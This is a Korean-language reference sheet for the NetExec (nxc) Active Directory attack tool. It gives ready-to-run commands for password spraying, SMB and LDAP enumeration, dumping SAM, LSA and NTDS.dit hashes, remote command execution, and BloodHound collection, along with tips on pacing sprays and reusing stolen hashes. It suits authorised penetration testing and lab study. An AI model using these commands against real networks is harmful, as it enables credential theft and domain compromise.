# NetExec (nxc)

- NetExec — CrackMapExec(CME)의 후속 유지보수 포크. SMB·WinRM·MSSQL·LDAP·WMI·SSH·FTP·RDP·NFS 등 여러 프로토콜로 인증 검증·열거·커맨드 실행·크리덴셜 덤프를 한 CLI로 처리한다. 칼리에서는 nxc 명령으로 부른다.
- 자격증명 1개를 도메인 전체에 검증·스프레이할 때, SMB·LDAP 열거, SAM/LSA/NTDS 덤프, 모듈 기반 정보수집, BloodHound 수집까지 한 번에 할 때.
- 인증 자료(암호·NTLM 해시·ccache), 대상 호스트·DC 주소, 설치는 칼리 `apt install netexec` 또는 pip.

## CME와의 관계

- CrackMapExec는 개발이 멈췄고 커뮤니티가 이어받은 NetExec가 표준이 됐다. 명령 체계·모듈·데이터베이스가 호환되며 nxc가 더 자주 갱신된다. 워크스루의 crackmapexec는 nxc로 바꿔 쓰면 대부분 그대로 동작한다.

## 인증 검증·스프레이

```bash
nxc smb 10.10.10.1 -u user -p 'Password1'
nxc smb hosts.txt -u users.txt -p passes.txt --continue-on-success
nxc smb 10.10.10.1 -u user -H 'NT_HASH'
nxc smb 10.10.10.1 -u user -p 'Password1' --local-auth
```

- 첫 열에 (+)면 인증 성공, (Pwn3d!)면 관리자 권한.
- `--continue-on-success`: 스프레이에서 첫 성공 후에도 계속 진행. `--jitter <초>`: 요청 간 지연. `-k`: Kerberos 인증.

## SMB 열거

```bash
nxc smb DC -u user -p 'Password1' --users
nxc smb DC -u user -p 'Password1' --shares
nxc smb DC -u user -p 'Password1' --pass-pol
nxc smb DC -u user -p 'Password1' --loggedon-users
nxc smb DC -u user -p 'Password1' --rid-brute
nxc smb DC -u user -p 'Password1' -M spider -o SHARE=SYSVOL
nxc smb DC -u user -p 'Password1' -M enum_av
```

- `--users --groups --shares --pass-pol --loggedon-users --sessions --rid-brute`: 계정·공유·정책·세션 열거.
- `-M <모듈>`: 모듈 실행. `nxc smb -L`로 목록 확인, `-M <모듈> --options`로 모듈 옵션 확인, `-o KEY=value`로 전달.
- spider는 공유 파일 순회, enum_av는 백신·EDR 제품 열거.

## 크리덴셜 덤프 (Pwn3d! 필요)

```bash
nxc smb 10.10.10.5 -u admin -p 'Password1' --sam
nxc smb 10.10.10.5 -u admin -p 'Password1' --lsa
nxc smb DC -u admin -p 'Password1' --ntds drsuapi
nxc smb DC -u admin -p 'Password1' --ntds vss
```

- `--sam`: 로컬 SAM 해시. `--lsa`: LSA 시크릿. `--ntds drsuapi|vss`: DC의 NTDS.dit 전체 해시.

## 프로토콜별 커맨드·쿼리·BloodHound

```bash
nxc winrm 10.10.10.5 -u admin -p 'Password1' -x "whoami"
nxc mssql 10.10.10.5 -u sa -p 'Password1' -x "whoami"
nxc mssql 10.10.10.5 -u sa -p 'Password1' -q "SELECT @@version"
nxc wmi 10.10.10.5 -u admin -p 'Password1' -x "ipconfig"
nxc ldap DC -u user -p 'Password1' --bloodhound -c All -ns 10.10.10.1
```

- `-x`: 원격 커맨드(winrm·mssql·wmi). `-q`: MSSQL 쿼리.
- ldap `--bloodhound -c All`: nxc에서 BloodHound 수집까지 바로 수행. `-ns`: DNS 서버 지정.

## 결과 데이터베이스

```bash
nxcdb
# nxcdb 셸 안에서
workspace create lab
proto smb
creds
export hosts detailed hosts.csv
```

- 실행 결과는 ~/.nxc/workspaces의 DB에 자동 기록된다. nxcdb에서 creds·hosts·shares를 조회·export하며, 수집한 해시·암호를 다음 실행의 -u·-H 재료로 쓸 수 있다.

## 팁·트러블슈팅

- SMB 연결 실패는 445 방화벽·서명 설정부터 확인하고, 이름 풀이 실패면 --kdcHost·-ns를 지정한다. --bloodhound 실패 시 DNS·GC 접근 권한을 확인.
- 스프레이는 잠금 정책 확인 후 --jitter로 천천히. 성공·실패 기록은 DB에 남으므로 재작업 때 creds로 이어 쓴다.
- 모듈은 --options로 필요 인자를 먼저 확인하고 -o로 넘긴다. 여러 모듈은 -M을 반복해 조합.
